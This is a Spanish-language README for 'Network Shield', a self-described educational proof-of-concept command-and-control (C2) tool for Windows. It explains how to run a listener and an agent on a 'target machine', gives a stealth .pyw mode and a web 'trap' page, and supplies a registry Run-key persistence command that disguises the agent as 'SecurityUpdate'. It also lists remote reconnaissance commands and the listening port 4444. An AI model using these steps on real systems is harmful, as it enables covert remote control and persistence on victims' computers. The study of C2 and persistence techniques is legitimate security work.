<p align="center">
  <a href="#-requisitos-del-sistema">
    <img src="https://img.shields.io/badge/Network_Shield-Documentación-007bff?style=for-the-badge&logo=opsgenie" alt="Docs">
  </a>
  <a href="https://www.python.org/downloads/">
    <img src="https://img.shields.io/badge/Python-Descargar-ffd343?style=for-the-badge&logo=python&logoColor=black" alt="Python">
  </a>
  <a href="#-solución-de-problemas-troubleshooting">
    <img src="https://img.shields.io/badge/Soporte-Errores_Comunes-f44336?style=for-the-badge" alt="Errores">
  </a>
</p>

# <p align="center">🛡️ Network Shield</p>
### <p align="center">Remote Administration System (PoC)</p>

---

<p align="center">
  <b>Prueba de Concepto para el estudio de sistemas de administración remota (C2) y técnicas de persistencia en entornos Windows.</b>
</p>

---

### <p align="center">⚠️ AVISO LEGAL CRÍTICO</p>
<p align="center"><i>Este software ha sido creado exclusivamente con fines educativos e investigación en ciberseguridad. El autor no se hace responsable del mal uso de este código. El uso en sistemas sin autorización es ilegal.</i></p>

---

## 🛠️ Requisitos del Sistema

* **XAMPP**: Servidor Apache y MySQL (MariaDB) instalados y activos.
* **Python 3.x**: Instalado y configurado correctamente en el PATH.
* **Librerías**: Ejecuta **pip install requests** en tu terminal.
* **Base de Datos**: Importar el esquema incluido en el archivo **server/db.txt**.

---

## 🚀 Guía de Instalación y Configuración

### 1. Preparación de la Base de Datos
1.  Inicia **Apache** y **MySQL** desde el panel de control de XAMPP.
2.  Accede a **http://localhost/phpmyadmin**.
3.  Crea una base de datos llamada `network_shield_db`.
4.  Importa el contenido de `server/db.txt` desde la pestaña **SQL**.

---

### 🔗 2. Configuración del Servidor Web
1.  Mueve la carpeta `Network-Shield-System` a la ruta `C:\xampp\htdocs\`.
2.  El panel será accesible en: **http://localhost/Network-Shield-System/server/index.php**.

---

## 📡 Ejecución y Pruebas

Sigue este orden estricto para establecer el enlace correctamente:

### 🟢 Paso 1: Iniciar el Receptor (Master)
Abre una terminal en la carpeta `master/` y lanza el centro de control ejecutando:
**python receptor.py**

---

### 🔵 Paso 2: Lanzar el Agente (Client)
Ejecuta el script en el equipo objetivo para iniciar la conexión:
* **Modo Manual**: python client/agente.py
* **Modo Invisible**: Renombra el archivo a `agente.pyw` y ejecútalo.
* **Simulación Web**: Accede a **http://localhost/Network-Shield-System/server/trampa.php**

---

## 🔐 Implementación de Persistencia

La persistencia permite que el agente se ejecute automáticamente al iniciar sesión.

### 1️⃣ Instalación (Crear Registro)
Envía este comando desde la terminal del receptor para registrar el agente:
**reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "pythonw.exe C:\xampp\htdocs\Network-Shield-System\client\agente.pyw" /f**

---

### 2️⃣ Comprobación (Verificar Estado)
Para confirmar que el registro se ha creado correctamente, ejecuta:
**reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate"**

---

### 3️⃣ Eliminación (Limpieza del Sistema)
Para desactivar el inicio automático y dejar el sistema limpio, ejecuta:
**reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f**

---

## 📂 Estructura del Repositorio

* 📁 **server/**: Panel de control web y base de datos.
* 📁 **client/**: Ejecución de comandos en el objetivo (agente).
* 📁 **master/**: Consola interactiva C2 (Command & Control).

---

## 📋 Comandos de Auditoría Disponibles

* 💻 **Sistema**: whoami, systeminfo, tasklist, ipconfig.
* 📂 **Archivos**: dir, cd .., type archivo.txt.
* 🌐 **Remoto**: start https://google.com, msg * "Acceso detectado".
* 🚪 **Sesión**: **exit** (Cierra la conexión de forma segura).

---

## 🛠️ Solución de Problemas (Troubleshooting)

* **❌ Error "Windows no puede encontrar el archivo 'python'"**: 
  Este error ocurre porque el servidor web no tiene acceso al comando global. Para solucionarlo, edita `trampa.php` y sustituye la llamada simple `python` por la ruta absoluta de tu ejecutable:
  *Ejemplo:* `C:\Users\NombreUsuario\AppData\Local\Programs\Python\Python39\python.exe`
* **🌐 No aparece en el Panel Web**: Revisa que la URL en `agente.py` coincida exactamente con tu carpeta en XAMPP.
* **🔥 Firewall**: Verifica que el puerto **4444** esté permitido para conexiones entrantes.

---

<p align="center">
  Desarrollado con ❤️ para fines de aprendizaje en Ciberseguridad
</p>
